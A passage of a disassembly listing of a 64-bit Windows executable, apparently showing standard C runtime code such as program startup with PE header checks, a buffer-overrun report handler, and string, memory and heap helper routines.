   140002475:	48 89 44 24 28       	mov    %rax,0x28(%rsp)
   14000247a:	4c 89 4c 24 20       	mov    %r9,0x20(%rsp)
   14000247f:	4d 8b c8             	mov    %r8,%r9
   140002482:	4c 8b c2             	mov    %rdx,%r8
   140002485:	48 8b d1             	mov    %rcx,%rdx
   140002488:	48 8d 0d b9 23 00 00 	lea    0x23b9(%rip),%rcx        # 0x140004848
   14000248f:	e8 d8 fe ff ff       	call   0x14000236c
   140002494:	85 c0                	test   %eax,%eax
   140002496:	79 03                	jns    0x14000249b
   140002498:	c6 03 00             	movb   $0x0,(%rbx)
   14000249b:	83 f8 fe             	cmp    $0xfffffffe,%eax
   14000249e:	75 30                	jne    0x1400024d0
   1400024a0:	e8 ff 0b 00 00       	call   0x1400030a4
   1400024a5:	c7 00 22 00 00 00    	movl   $0x22,(%rax)
   1400024ab:	eb 0b                	jmp    0x1400024b8
   1400024ad:	e8 f2 0b 00 00       	call   0x1400030a4
   1400024b2:	c7 00 16 00 00 00    	movl   $0x16,(%rax)
   1400024b8:	48 83 64 24 20 00    	andq   $0x0,0x20(%rsp)
   1400024be:	45 33 c9             	xor    %r9d,%r9d
   1400024c1:	45 33 c0             	xor    %r8d,%r8d
   1400024c4:	33 d2                	xor    %edx,%edx
   1400024c6:	33 c9                	xor    %ecx,%ecx
   1400024c8:	e8 07 0b 00 00       	call   0x140002fd4
   1400024cd:	83 c8 ff             	or     $0xffffffff,%eax
   1400024d0:	48 83 c4 30          	add    $0x30,%rsp
   1400024d4:	5b                   	pop    %rbx
   1400024d5:	c3                   	ret
   1400024d6:	cc                   	int3
   1400024d7:	cc                   	int3
   1400024d8:	48 83 ec 38          	sub    $0x38,%rsp
   1400024dc:	4c 89 4c 24 20       	mov    %r9,0x20(%rsp)
   1400024e1:	45 33 c9             	xor    %r9d,%r9d
   1400024e4:	e8 6f ff ff ff       	call   0x140002458
   1400024e9:	48 83 c4 38          	add    $0x38,%rsp
   1400024ed:	c3                   	ret
   1400024ee:	cc                   	int3
   1400024ef:	cc                   	int3
   1400024f0:	48 89 5c 24 10       	mov    %rbx,0x10(%rsp)
   1400024f5:	48 89 74 24 18       	mov    %rsi,0x18(%rsp)
   1400024fa:	57                   	push   %rdi
   1400024fb:	48 81 ec a0 00 00 00 	sub    $0xa0,%rsp
   140002502:	48 8d 4c 24 30       	lea    0x30(%rsp),%rcx
   140002507:	ff 15 f3 bb 00 00    	call   *0xbbf3(%rip)        # 0x14000e100
   14000250d:	90                   	nop
   14000250e:	b8 4d 5a 00 00       	mov    $0x5a4d,%eax
   140002513:	66 39 05 e6 da ff ff 	cmp    %ax,-0x251a(%rip)        # 0x140000000
   14000251a:	75 62                	jne    0x14000257e
   14000251c:	48 63 05 19 db ff ff 	movslq -0x24e7(%rip),%rax        # 0x14000003c
   140002523:	48 8d 35 d6 da ff ff 	lea    -0x252a(%rip),%rsi        # 0x140000000
   14000252a:	48 03 c6             	add    %rsi,%rax
   14000252d:	81 38 50 45 00 00    	cmpl   $0x4550,(%rax)
   140002533:	74 0b                	je     0x140002540
   140002535:	33 db                	xor    %ebx,%ebx
   140002537:	89 9c 24 b0 00 00 00 	mov    %ebx,0xb0(%rsp)
   14000253e:	eb 4e                	jmp    0x14000258e
   140002540:	b9 0b 02 00 00       	mov    $0x20b,%ecx
   140002545:	66 39 48 18          	cmp    %cx,0x18(%rax)
   140002549:	74 0b                	je     0x140002556
   14000254b:	33 db                	xor    %ebx,%ebx
   14000254d:	89 9c 24 b0 00 00 00 	mov    %ebx,0xb0(%rsp)
   140002554:	eb 38                	jmp    0x14000258e
   140002556:	83 b8 84 00 00 00 0e 	cmpl   $0xe,0x84(%rax)
   14000255d:	77 0b                	ja     0x14000256a
   14000255f:	33 db                	xor    %ebx,%ebx
   140002561:	89 9c 24 b0 00 00 00 	mov    %ebx,0xb0(%rsp)
   140002568:	eb 24                	jmp    0x14000258e
   14000256a:	33 db                	xor    %ebx,%ebx
   14000256c:	39 98 f8 00 00 00    	cmp    %ebx,0xf8(%rax)
   140002572:	0f 95 c3             	setne  %bl
   140002575:	89 9c 24 b0 00 00 00 	mov    %ebx,0xb0(%rsp)
   14000257c:	eb 10                	jmp    0x14000258e
   14000257e:	33 db                	xor    %ebx,%ebx
   140002580:	89 9c 24 b0 00 00 00 	mov    %ebx,0xb0(%rsp)
   140002587:	48 8d 35 72 da ff ff 	lea    -0x258e(%rip),%rsi        # 0x140000000
   14000258e:	bf 01 00 00 00       	mov    $0x1,%edi
   140002593:	8b cf                	mov    %edi,%ecx
   140002595:	e8 26 37 00 00       	call   0x140005cc0
   14000259a:	85 c0                	test   %eax,%eax
   14000259c:	75 21                	jne    0x1400025bf
   14000259e:	39 3d 84 20 01 00    	cmp    %edi,0x12084(%rip)        # 0x140014628
   1400025a4:	75 05                	jne    0x1400025ab
   1400025a6:	e8 6d 14 00 00       	call   0x140003a18
   1400025ab:	b9 1c 00 00 00       	mov    $0x1c,%ecx
   1400025b0:	e8 3b 12 00 00       	call   0x1400037f0
   1400025b5:	b9 ff 00 00 00       	mov    $0xff,%ecx
   1400025ba:	e8 31 fa ff ff       	call   0x140001ff0
   1400025bf:	e8 a8 11 00 00       	call   0x14000376c
   1400025c4:	85 c0                	test   %eax,%eax
   1400025c6:	75 21                	jne    0x1400025e9
   1400025c8:	39 3d 5a 20 01 00    	cmp    %edi,0x1205a(%rip)        # 0x140014628
   1400025ce:	75 05                	jne    0x1400025d5
   1400025d0:	e8 43 14 00 00       	call   0x140003a18
   1400025d5:	b9 10 00 00 00       	mov    $0x10,%ecx
   1400025da:	e8 11 12 00 00       	call   0x1400037f0
   1400025df:	b9 ff 00 00 00       	mov    $0xff,%ecx
   1400025e4:	e8 07 fa ff ff       	call   0x140001ff0
   1400025e9:	e8 c2 16 00 00       	call   0x140003cb0
   1400025ee:	90                   	nop
   1400025ef:	e8 dc 33 00 00       	call   0x1400059d0
   1400025f4:	85 c0                	test   %eax,%eax
   1400025f6:	79 0a                	jns    0x140002602
   1400025f8:	b9 1b 00 00 00       	mov    $0x1b,%ecx
   1400025fd:	e8 82 f9 ff ff       	call   0x140001f84
   140002602:	ff 15 f0 ba 00 00    	call   *0xbaf0(%rip)        # 0x14000e0f8
   140002608:	48 89 05 71 41 01 00 	mov    %rax,0x14171(%rip)        # 0x140016780
   14000260f:	e8 08 32 00 00       	call   0x14000581c
   140002614:	48 89 05 fd 1f 01 00 	mov    %rax,0x11ffd(%rip)        # 0x140014618
   14000261b:	e8 04 31 00 00       	call   0x140005724
   140002620:	85 c0                	test   %eax,%eax
   140002622:	79 0a                	jns    0x14000262e
   140002624:	b9 08 00 00 00       	mov    $0x8,%ecx
   140002629:	e8 56 f9 ff ff       	call   0x140001f84
   14000262e:	e8 f1 2d 00 00       	call   0x140005424
   140002633:	85 c0                	test   %eax,%eax
   140002635:	79 0a                	jns    0x140002641
   140002637:	b9 09 00 00 00       	mov    $0x9,%ecx
   14000263c:	e8 43 f9 ff ff       	call   0x140001f84
   140002641:	8b cf                	mov    %edi,%ecx
   140002643:	e8 48 fa ff ff       	call   0x140002090
   140002648:	85 c0                	test   %eax,%eax
   14000264a:	74 07                	je     0x140002653
   14000264c:	8b c8                	mov    %eax,%ecx
   14000264e:	e8 31 f9 ff ff       	call   0x140001f84
   140002653:	e8 50 2d 00 00       	call   0x1400053a8
   140002658:	40 84 7c 24 6c       	test   %dil,0x6c(%rsp)
   14000265d:	0f b7 54 24 70       	movzwl 0x70(%rsp),%edx
   140002662:	41 b9 0a 00 00 00    	mov    $0xa,%r9d
   140002668:	44 0f 45 ca          	cmovne %edx,%r9d
   14000266c:	4c 8b c0             	mov    %rax,%r8
   14000266f:	33 d2                	xor    %edx,%edx
   140002671:	48 8b ce             	mov    %rsi,%rcx
   140002674:	e8 f7 ea ff ff       	call   0x140001170
   140002679:	8b f8                	mov    %eax,%edi
   14000267b:	89 44 24 20          	mov    %eax,0x20(%rsp)
   14000267f:	85 db                	test   %ebx,%ebx
   140002681:	75 07                	jne    0x14000268a
   140002683:	8b c8                	mov    %eax,%ecx
   140002685:	e8 42 fc ff ff       	call   0x1400022cc
   14000268a:	e8 55 fc ff ff       	call   0x1400022e4
   14000268f:	eb 1a                	jmp    0x1400026ab
   140002691:	8b f8                	mov    %eax,%edi
   140002693:	83 bc 24 b0 00 00 00 	cmpl   $0x0,0xb0(%rsp)
   14000269a:	00 
   14000269b:	75 08                	jne    0x1400026a5
   14000269d:	8b c8                	mov    %eax,%ecx
   14000269f:	e8 34 fc ff ff       	call   0x1400022d8
   1400026a4:	cc                   	int3
   1400026a5:	e8 4a fc ff ff       	call   0x1400022f4
   1400026aa:	90                   	nop
   1400026ab:	8b c7                	mov    %edi,%eax
   1400026ad:	eb 05                	jmp    0x1400026b4
   1400026af:	b8 ff 00 00 00       	mov    $0xff,%eax
   1400026b4:	4c 8d 9c 24 a0 00 00 	lea    0xa0(%rsp),%r11
   1400026bb:	00 
   1400026bc:	49 8b 5b 18          	mov    0x18(%r11),%rbx
   1400026c0:	49 8b 73 20          	mov    0x20(%r11),%rsi
   1400026c4:	49 8b e3             	mov    %r11,%rsp
   1400026c7:	5f                   	pop    %rdi
   1400026c8:	c3                   	ret
   1400026c9:	cc                   	int3
   1400026ca:	cc                   	int3
   1400026cb:	cc                   	int3
   1400026cc:	48 83 ec 28          	sub    $0x28,%rsp
   1400026d0:	e8 37 36 00 00       	call   0x140005d0c
   1400026d5:	48 83 c4 28          	add    $0x28,%rsp
   1400026d9:	e9 12 fe ff ff       	jmp    0x1400024f0
   1400026de:	cc                   	int3
   1400026df:	cc                   	int3
   1400026e0:	48 89 4c 24 08       	mov    %rcx,0x8(%rsp)
   1400026e5:	48 81 ec 88 00 00 00 	sub    $0x88,%rsp
   1400026ec:	48 8d 0d dd 1f 01 00 	lea    0x11fdd(%rip),%rcx        # 0x1400146d0
   1400026f3:	ff 15 47 ba 00 00    	call   *0xba47(%rip)        # 0x14000e140
   1400026f9:	4c 8b 1d c8 20 01 00 	mov    0x120c8(%rip),%r11        # 0x1400147c8
   140002700:	4c 89 5c 24 58       	mov    %r11,0x58(%rsp)
   140002705:	45 33 c0             	xor    %r8d,%r8d
   140002708:	48 8d 54 24 60       	lea    0x60(%rsp),%rdx
   14000270d:	48 8b 4c 24 58       	mov    0x58(%rsp),%rcx
   140002712:	e8 c9 7e 00 00       	call   0x14000a5e0
   140002717:	48 89 44 24 50       	mov    %rax,0x50(%rsp)
   14000271c:	48 83 7c 24 50 00    	cmpq   $0x0,0x50(%rsp)
   140002722:	74 41                	je     0x140002765
   140002724:	48 c7 44 24 38 00 00 	movq   $0x0,0x38(%rsp)
   14000272b:	00 00 
   14000272d:	48 8d 44 24 48       	lea    0x48(%rsp),%rax
   140002732:	48 89 44 24 30       	mov    %rax,0x30(%rsp)
   140002737:	48 8d 44 24 40       	lea    0x40(%rsp),%rax
   14000273c:	48 89 44 24 28       	mov    %rax,0x28(%rsp)
   140002741:	48 8d 05 88 1f 01 00 	lea    0x11f88(%rip),%rax        # 0x1400146d0
   140002748:	48 89 44 24 20       	mov    %rax,0x20(%rsp)
   14000274d:	4c 8b 4c 24 50       	mov    0x50(%rsp),%r9
   140002752:	4c 8b 44 24 58       	mov    0x58(%rsp),%r8
   140002757:	48 8b 54 24 60       	mov    0x60(%rsp),%rdx
   14000275c:	33 c9                	xor    %ecx,%ecx
   14000275e:	e8 77 7e 00 00       	call   0x14000a5da
   140002763:	eb 22                	jmp    0x140002787
   140002765:	48 8b 84 24 88 00 00 	mov    0x88(%rsp),%rax
   14000276c:	00 
   14000276d:	48 89 05 54 20 01 00 	mov    %rax,0x12054(%rip)        # 0x1400147c8
   140002774:	48 8d 84 24 88 00 00 	lea    0x88(%rsp),%rax
   14000277b:	00 
   14000277c:	48 83 c0 08          	add    $0x8,%rax
   140002780:	48 89 05 e1 1f 01 00 	mov    %rax,0x11fe1(%rip)        # 0x140014768
   140002787:	48 8b 05 3a 20 01 00 	mov    0x1203a(%rip),%rax        # 0x1400147c8
   14000278e:	48 89 05 ab 1e 01 00 	mov    %rax,0x11eab(%rip)        # 0x140014640
   140002795:	48 8b 84 24 90 00 00 	mov    0x90(%rsp),%rax
   14000279c:	00 
   14000279d:	48 89 05 ac 1f 01 00 	mov    %rax,0x11fac(%rip)        # 0x140014750
   1400027a4:	c7 05 82 1e 01 00 09 	movl   $0xc0000409,0x11e82(%rip)        # 0x140014630
   1400027ab:	04 00 c0 
   1400027ae:	c7 05 7c 1e 01 00 01 	movl   $0x1,0x11e7c(%rip)        # 0x140014634
   1400027b5:	00 00 00 
   1400027b8:	48 8b 05 89 08 01 00 	mov    0x10889(%rip),%rax        # 0x140013048
   1400027bf:	48 89 44 24 68       	mov    %rax,0x68(%rsp)
   1400027c4:	48 8b 05 85 08 01 00 	mov    0x10885(%rip),%rax        # 0x140013050
   1400027cb:	48 89 44 24 70       	mov    %rax,0x70(%rsp)
   1400027d0:	ff 15 52 b9 00 00    	call   *0xb952(%rip)        # 0x14000e128
   1400027d6:	89 05 ec 1e 01 00    	mov    %eax,0x11eec(%rip)        # 0x1400146c8
   1400027dc:	b9 01 00 00 00       	mov    $0x1,%ecx
   1400027e1:	e8 da 35 00 00       	call   0x140005dc0
   1400027e6:	33 c9                	xor    %ecx,%ecx
   1400027e8:	ff 15 32 b9 00 00    	call   *0xb932(%rip)        # 0x14000e120
   1400027ee:	48 8d 0d ab bb 00 00 	lea    0xbbab(%rip),%rcx        # 0x14000e3a0
   1400027f5:	ff 15 1d b9 00 00    	call   *0xb91d(%rip)        # 0x14000e118
   1400027fb:	83 3d c6 1e 01 00 00 	cmpl   $0x0,0x11ec6(%rip)        # 0x1400146c8
   140002802:	75 0a                	jne    0x14000280e
   140002804:	b9 01 00 00 00       	mov    $0x1,%ecx
   140002809:	e8 b2 35 00 00       	call   0x140005dc0
   14000280e:	ff 15 fc b8 00 00    	call   *0xb8fc(%rip)        # 0x14000e110
   140002814:	ba 09 04 00 c0       	mov    $0xc0000409,%edx
   140002819:	48 8b c8             	mov    %rax,%rcx
   14000281c:	ff 15 e6 b8 00 00    	call   *0xb8e6(%rip)        # 0x14000e108
   140002822:	48 81 c4 88 00 00 00 	add    $0x88,%rsp
   140002829:	c3                   	ret
   14000282a:	cc                   	int3
   14000282b:	cc                   	int3
   14000282c:	40 53                	rex push %rbx
   14000282e:	48 83 ec 30          	sub    $0x30,%rsp
   140002832:	48 85 c9             	test   %rcx,%rcx
   140002835:	74 0d                	je     0x140002844
   140002837:	48 85 d2             	test   %rdx,%rdx
   14000283a:	74 08                	je     0x140002844
   14000283c:	4d 85 c0             	test   %r8,%r8
   14000283f:	75 2c                	jne    0x14000286d
   140002841:	44 88 01             	mov    %r8b,(%rcx)
   140002844:	e8 5b 08 00 00       	call   0x1400030a4
   140002849:	bb 16 00 00 00       	mov    $0x16,%ebx
   14000284e:	48 83 64 24 20 00    	andq   $0x0,0x20(%rsp)
   140002854:	45 33 c9             	xor    %r9d,%r9d
   140002857:	45 33 c0             	xor    %r8d,%r8d
   14000285a:	33 d2                	xor    %edx,%edx
   14000285c:	33 c9                	xor    %ecx,%ecx
   14000285e:	89 18                	mov    %ebx,(%rax)
   140002860:	e8 6f 07 00 00       	call   0x140002fd4
   140002865:	8b c3                	mov    %ebx,%eax
   140002867:	48 83 c4 30          	add    $0x30,%rsp
   14000286b:	5b                   	pop    %rbx
   14000286c:	c3                   	ret
   14000286d:	4c 8b c9             	mov    %rcx,%r9
   140002870:	41 8a 00             	mov    (%r8),%al
   140002873:	49 ff c0             	inc    %r8
   140002876:	41 88 01             	mov    %al,(%r9)
   140002879:	49 ff c1             	inc    %r9
   14000287c:	84 c0                	test   %al,%al
   14000287e:	74 06                	je     0x140002886
   140002880:	48 83 ea 01          	sub    $0x1,%rdx
   140002884:	75 ea                	jne    0x140002870
   140002886:	48 85 d2             	test   %rdx,%rdx
   140002889:	75 0e                	jne    0x140002899
   14000288b:	88 11                	mov    %dl,(%rcx)
   14000288d:	e8 12 08 00 00       	call   0x1400030a4
   140002892:	bb 22 00 00 00       	mov    $0x22,%ebx
   140002897:	eb b5                	jmp    0x14000284e
   140002899:	33 c0                	xor    %eax,%eax
   14000289b:	eb ca                	jmp    0x140002867
   14000289d:	cc                   	int3
   14000289e:	cc                   	int3
   14000289f:	cc                   	int3
   1400028a0:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   1400028a5:	48 89 74 24 10       	mov    %rsi,0x10(%rsp)
   1400028aa:	57                   	push   %rdi
   1400028ab:	48 83 ec 20          	sub    $0x20,%rsp
   1400028af:	48 8b d9             	mov    %rcx,%rbx
   1400028b2:	48 83 f9 e0          	cmp    $0xffffffffffffffe0,%rcx
   1400028b6:	77 7c                	ja     0x140002934
   1400028b8:	bf 01 00 00 00       	mov    $0x1,%edi
   1400028bd:	48 85 c9             	test   %rcx,%rcx
   1400028c0:	48 0f 45 f9          	cmovne %rcx,%rdi
   1400028c4:	48 8b 0d a5 29 01 00 	mov    0x129a5(%rip),%rcx        # 0x140015270
   1400028cb:	48 85 c9             	test   %rcx,%rcx
   1400028ce:	75 20                	jne    0x1400028f0
   1400028d0:	e8 43 11 00 00       	call   0x140003a18
   1400028d5:	b9 1e 00 00 00       	mov    $0x1e,%ecx
   1400028da:	e8 11 0f 00 00       	call   0x1400037f0
   1400028df:	b9 ff 00 00 00       	mov    $0xff,%ecx
   1400028e4:	e8 07 f7 ff ff       	call   0x140001ff0
   1400028e9:	48 8b 0d 80 29 01 00 	mov    0x12980(%rip),%rcx        # 0x140015270
   1400028f0:	4c 8b c7             	mov    %rdi,%r8
   1400028f3:	33 d2                	xor    %edx,%edx
   1400028f5:	ff 15 4d b8 00 00    	call   *0xb84d(%rip)        # 0x14000e148
   1400028fb:	48 8b f0             	mov    %rax,%rsi
   1400028fe:	48 85 c0             	test   %rax,%rax
   140002901:	75 2c                	jne    0x14000292f
   140002903:	39 05 6f 29 01 00    	cmp    %eax,0x1296f(%rip)        # 0x140015278
   140002909:	74 0e                	je     0x140002919
   14000290b:	48 8b cb             	mov    %rbx,%rcx
   14000290e:	e8 b9 0a 00 00       	call   0x1400033cc
   140002913:	85 c0                	test   %eax,%eax
   140002915:	74 0d                	je     0x140002924
   140002917:	eb ab                	jmp    0x1400028c4
   140002919:	e8 86 07 00 00       	call   0x1400030a4
   14000291e:	c7 00 0c 00 00 00    	movl   $0xc,(%rax)
   140002924:	e8 7b 07 00 00       	call   0x1400030a4
   140002929:	c7 00 0c 00 00 00    	movl   $0xc,(%rax)
   14000292f:	48 8b c6             	mov    %rsi,%rax
   140002932:	eb 12                	jmp    0x140002946
   140002934:	e8 93 0a 00 00       	call   0x1400033cc
   140002939:	e8 66 07 00 00       	call   0x1400030a4
   14000293e:	c7 00 0c 00 00 00    	movl   $0xc,(%rax)
   140002944:	33 c0                	xor    %eax,%eax
   140002946:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   14000294b:	48 8b 74 24 38       	mov    0x38(%rsp),%rsi
   140002950:	48 83 c4 20          	add    $0x20,%rsp
   140002954:	5f                   	pop    %rdi
   140002955:	c3                   	ret
   140002956:	cc                   	int3
   140002957:	cc                   	int3
   140002958:	cc                   	int3
   140002959:	cc                   	int3
   14000295a:	cc                   	int3
   14000295b:	cc                   	int3
   14000295c:	cc                   	int3
   14000295d:	cc                   	int3
   14000295e:	cc                   	int3
   14000295f:	cc                   	int3
   140002960:	cc                   	int3
   140002961:	cc                   	int3
   140002962:	cc                   	int3
   140002963:	cc                   	int3
   140002964:	cc                   	int3
   140002965:	cc                   	int3
   140002966:	66 66 0f 1f 84 00 00 	data16 nopw 0x0(%rax,%rax,1)
   14000296d:	00 00 00 
   140002970:	48 8b c1             	mov    %rcx,%rax
   140002973:	48 f7 d9             	neg    %rcx
   140002976:	48 a9 07 00 00 00    	test   $0x7,%rax
   14000297c:	74 0f                	je     0x14000298d
   14000297e:	66 90                	xchg   %ax,%ax
   140002980:	8a 10                	mov    (%rax),%dl
   140002982:	48 ff c0             	inc    %rax
   140002985:	84 d2                	test   %dl,%dl
   140002987:	74 5f                	je     0x1400029e8
   140002989:	a8 07                	test   $0x7,%al
   14000298b:	75 f3                	jne    0x140002980
   14000298d:	49 b8 ff fe fe fe fe 	movabs $0x7efefefefefefeff,%r8
   140002994:	fe fe 7e 
   140002997:	49 bb 00 01 01 01 01 	movabs $0x8101010101010100,%r11
   14000299e:	01 01 81 
   1400029a1:	48 8b 10             	mov    (%rax),%rdx
   1400029a4:	4d 8b c8             	mov    %r8,%r9
   1400029a7:	48 83 c0 08          	add    $0x8,%rax
   1400029ab:	4c 03 ca             	add    %rdx,%r9
   1400029ae:	48 f7 d2             	not    %rdx
   1400029b1:	49 33 d1             	xor    %r9,%rdx
   1400029b4:	49 23 d3             	and    %r11,%rdx
   1400029b7:	74 e8                	je     0x1400029a1
   1400029b9:	48 8b 50 f8          	mov    -0x8(%rax),%rdx
   1400029bd:	84 d2                	test   %dl,%dl
   1400029bf:	74 51                	je     0x140002a12
   1400029c1:	84 f6                	test   %dh,%dh
   1400029c3:	74 47                	je     0x140002a0c
   1400029c5:	48 c1 ea 10          	shr    $0x10,%rdx
   1400029c9:	84 d2                	test   %dl,%dl
   1400029cb:	74 39                	je     0x140002a06
   1400029cd:	84 f6                	test   %dh,%dh
   1400029cf:	74 2f                	je     0x140002a00
   1400029d1:	48 c1 ea 10          	shr    $0x10,%rdx
   1400029d5:	84 d2                	test   %dl,%dl
   1400029d7:	74 21                	je     0x1400029fa
   1400029d9:	84 f6                	test   %dh,%dh
   1400029db:	74 17                	je     0x1400029f4
   1400029dd:	c1 ea 10             	shr    $0x10,%edx
   1400029e0:	84 d2                	test   %dl,%dl
   1400029e2:	74 0a                	je     0x1400029ee
   1400029e4:	84 f6                	test   %dh,%dh
   1400029e6:	75 b9                	jne    0x1400029a1
   1400029e8:	48 8d 44 01 ff       	lea    -0x1(%rcx,%rax,1),%rax
   1400029ed:	c3                   	ret
   1400029ee:	48 8d 44 01 fe       	lea    -0x2(%rcx,%rax,1),%rax
   1400029f3:	c3                   	ret
   1400029f4:	48 8d 44 01 fd       	lea    -0x3(%rcx,%rax,1),%rax
   1400029f9:	c3                   	ret
   1400029fa:	48 8d 44 01 fc       	lea    -0x4(%rcx,%rax,1),%rax
   1400029ff:	c3                   	ret
   140002a00:	48 8d 44 01 fb       	lea    -0x5(%rcx,%rax,1),%rax
   140002a05:	c3                   	ret
   140002a06:	48 8d 44 01 fa       	lea    -0x6(%rcx,%rax,1),%rax
   140002a0b:	c3                   	ret
   140002a0c:	48 8d 44 01 f9       	lea    -0x7(%rcx,%rax,1),%rax
   140002a11:	c3                   	ret
   140002a12:	48 8d 44 01 f8       	lea    -0x8(%rcx,%rax,1),%rax
   140002a17:	c3                   	ret
   140002a18:	48 85 c9             	test   %rcx,%rcx
   140002a1b:	74 37                	je     0x140002a54
   140002a1d:	53                   	push   %rbx
   140002a1e:	48 83 ec 20          	sub    $0x20,%rsp
   140002a22:	4c 8b c1             	mov    %rcx,%r8
   140002a25:	48 8b 0d 44 28 01 00 	mov    0x12844(%rip),%rcx        # 0x140015270
   140002a2c:	33 d2                	xor    %edx,%edx
   140002a2e:	ff 15 1c b7 00 00    	call   *0xb71c(%rip)        # 0x14000e150
   140002a34:	85 c0                	test   %eax,%eax
   140002a36:	75 17                	jne    0x140002a4f
   140002a38:	e8 67 06 00 00       	call   0x1400030a4
   140002a3d:	48 8b d8             	mov    %rax,%rbx
   140002a40:	ff 15 0a b6 00 00    	call   *0xb60a(%rip)        # 0x14000e050
   140002a46:	8b c8                	mov    %eax,%ecx
   140002a48:	e8 0f 06 00 00       	call   0x14000305c
   140002a4d:	89 03                	mov    %eax,(%rbx)
   140002a4f:	48 83 c4 20          	add    $0x20,%rsp
   140002a53:	5b                   	pop    %rbx
   140002a54:	c3                   	ret
   140002a55:	cc                   	int3
   140002a56:	cc                   	int3
   140002a57:	cc                   	int3
   140002a58:	cc                   	int3
   140002a59:	cc                   	int3
   140002a5a:	cc                   	int3
   140002a5b:	cc                   	int3
   140002a5c:	cc                   	int3
   140002a5d:	cc                   	int3
   140002a5e:	cc                   	int3
   140002a5f:	cc                   	int3
   140002a60:	cc                   	int3
   140002a61:	cc                   	int3
   140002a62:	cc                   	int3
   140002a63:	cc                   	int3
   140002a64:	cc                   	int3
   140002a65:	cc                   	int3
   140002a66:	66 66 0f 1f 84 00 00 	data16 nopw 0x0(%rax,%rax,1)
   140002a6d:	00 00 00 
   140002a70:	48 8b c1             	mov    %rcx,%rax
   140002a73:	49 83 f8 08          	cmp    $0x8,%r8
   140002a77:	72 53                	jb     0x140002acc
   140002a79:	0f b6 d2             	movzbl %dl,%edx
   140002a7c:	49 b9 01 01 01 01 01 	movabs $0x101010101010101,%r9
   140002a83:	01 01 01 
   140002a86:	49 0f af d1          	imul   %r9,%rdx
   140002a8a:	49 83 f8 40          	cmp    $0x40,%r8
   140002a8e:	72 1e                	jb     0x140002aae
   140002a90:	48 f7 d9             	neg    %rcx
   140002a93:	83 e1 07             	and    $0x7,%ecx
   140002a96:	74 06                	je     0x140002a9e
   140002a98:	4c 2b c1             	sub    %rcx,%r8
   140002a9b:	48 89 10             	mov    %rdx,(%rax)
   140002a9e:	48 03 c8             	add    %rax,%rcx
   140002aa1:	4d 8b c8             	mov    %r8,%r9
   140002aa4:	49 83 e0 3f          	and    $0x3f,%r8
   140002aa8:	49 c1 e9 06          	shr    $0x6,%r9
   140002aac:	75 39                	jne    0x140002ae7
   140002aae:	4d 8b c8             	mov    %r8,%r9
   140002ab1:	49 83 e0 07          	and    $0x7,%r8
   140002ab5:	49 c1 e9 03          	shr    $0x3,%r9
   140002ab9:	74 11                	je     0x140002acc
   140002abb:	66 66 66 90          	data16 data16 xchg %ax,%ax
   140002abf:	90                   	nop
   140002ac0:	48 89 11             	mov    %rdx,(%rcx)
   140002ac3:	48 83 c1 08          	add    $0x8,%rcx
   140002ac7:	49 ff c9             	dec    %r9
   140002aca:	75 f4                	jne    0x140002ac0
   140002acc:	4d 85 c0             	test   %r8,%r8
   140002acf:	74 0a                	je     0x140002adb
   140002ad1:	88 11                	mov    %dl,(%rcx)
   140002ad3:	48 ff c1             	inc    %rcx
   140002ad6:	49 ff c8             	dec    %r8
   140002ad9:	75 f6                	jne    0x140002ad1
   140002adb:	c3                   	ret
   140002adc:	0f 1f 40 00          	nopl   0x0(%rax)
   140002ae0:	66 66 66 90          	data16 data16 xchg %ax,%ax
   140002ae4:	66 66 90             	data16 xchg %ax,%ax
   140002ae7:	49 81 f9 00 1c 00 00 	cmp    $0x1c00,%r9
   140002aee:	73 30                	jae    0x140002b20
   140002af0:	48 89 11             	mov    %rdx,(%rcx)
   140002af3:	48 89 51 08          	mov    %rdx,0x8(%rcx)
   140002af7:	48 89 51 10          	mov    %rdx,0x10(%rcx)
   140002afb:	48 83 c1 40          	add    $0x40,%rcx
   140002aff:	48 89 51 d8          	mov    %rdx,-0x28(%rcx)
   140002b03:	48 89 51 e0          	mov    %rdx,-0x20(%rcx)
   140002b07:	49 ff c9             	dec    %r9
   140002b0a:	48 89 51 e8          	mov    %rdx,-0x18(%rcx)
   140002b0e:	48 89 51 f0          	mov    %rdx,-0x10(%rcx)
   140002b12:	48 89 51 f8          	mov    %rdx,-0x8(%rcx)
   140002b16:	75 d8                	jne    0x140002af0
   140002b18:	eb 94                	jmp    0x140002aae
   140002b1a:	66 0f 1f 44 00 00    	nopw   0x0(%rax,%rax,1)
   140002b20:	48 0f c3 11          	movnti %rdx,(%rcx)
   140002b24:	48 0f c3 51 08       	movnti %rdx,0x8(%rcx)
   140002b29:	48 0f c3 51 10       	movnti %rdx,0x10(%rcx)
   140002b2e:	48 83 c1 40          	add    $0x40,%rcx
   140002b32:	48 0f c3 51 d8       	movnti %rdx,-0x28(%rcx)
   140002b37:	48 0f c3 51 e0       	movnti %rdx,-0x20(%rcx)
   140002b3c:	49 ff c9             	dec    %r9
   140002b3f:	48 0f c3 51 e8       	movnti %rdx,-0x18(%rcx)
   140002b44:	48 0f c3 51 f0       	movnti %rdx,-0x10(%rcx)
   140002b49:	48 0f c3 51 f8       	movnti %rdx,-0x8(%rcx)
   140002b4e:	75 d0                	jne    0x140002b20
   140002b50:	f0 80 0c 24 00       	lock orb $0x0,(%rsp)
   140002b55:	e9 54 ff ff ff       	jmp    0x140002aae
   140002b5a:	cc                   	int3
   140002b5b:	cc                   	int3
   140002b5c:	cc                   	int3
   140002b5d:	cc                   	int3
   140002b5e:	cc                   	int3
   140002b5f:	cc                   	int3
   140002b60:	cc                   	int3
   140002b61:	cc                   	int3
   140002b62:	cc                   	int3
   140002b63:	cc                   	int3
   140002b64:	cc                   	int3
   140002b65:	cc                   	int3
   140002b66:	66 66 0f 1f 84 00 00 	data16 nopw 0x0(%rax,%rax,1)
   140002b6d:	00 00 00 
   140002b70:	4c 8b d9             	mov    %rcx,%r11
   140002b73:	48 2b d1             	sub    %rcx,%rdx
   140002b76:	0f 82 9e 01 00 00    	jb     0x140002d1a
   140002b7c:	49 83 f8 08          	cmp    $0x8,%r8
   140002b80:	72 61                	jb     0x140002be3
   140002b82:	f6 c1 07             	test   $0x7,%cl
   140002b85:	74 36                	je     0x140002bbd
   140002b87:	f6 c1 01             	test   $0x1,%cl
   140002b8a:	74 0b                	je     0x140002b97
   140002b8c:	8a 04 0a             	mov    (%rdx,%rcx,1),%al
   140002b8f:	49 ff c8             	dec    %r8
   140002b92:	88 01                	mov    %al,(%rcx)
   140002b94:	48 ff c1             	inc    %rcx
   140002b97:	f6 c1 02             	test   $0x2,%cl
   140002b9a:	74 0f                	je     0x140002bab
